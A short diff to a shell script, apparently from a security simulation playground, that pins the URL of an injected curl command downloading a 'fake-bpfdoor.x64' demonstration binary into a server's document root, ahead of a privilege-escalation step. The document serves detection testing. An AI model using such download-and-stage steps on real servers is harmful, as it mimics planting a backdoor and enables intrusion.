@@ -33,7 +33,8 @@ server's document root directory, making it accessible and ready for \
 execution. Note: This is a harmless demonstration binary.\033[0m
 EOF
 wait_for_confirmation
-inject "curl -OL https://raw.githubusercontent.com/DataDog/datadog-security-playground/main/assets/bpfdoor/fake-bpfdoor.x64"
+# The GIT_SHA environment variable is set at container build time in app/Dockerfile
+inject "curl -OL https://raw.githubusercontent.com/DataDog/datadog-security-playground/${GIT_SHA}/assets/bpfdoor/fake-bpfdoor.x64"
 
 step <<EOF
 ${PURPLE}Privilege Escalation - Set Execution Permissions\033[0m
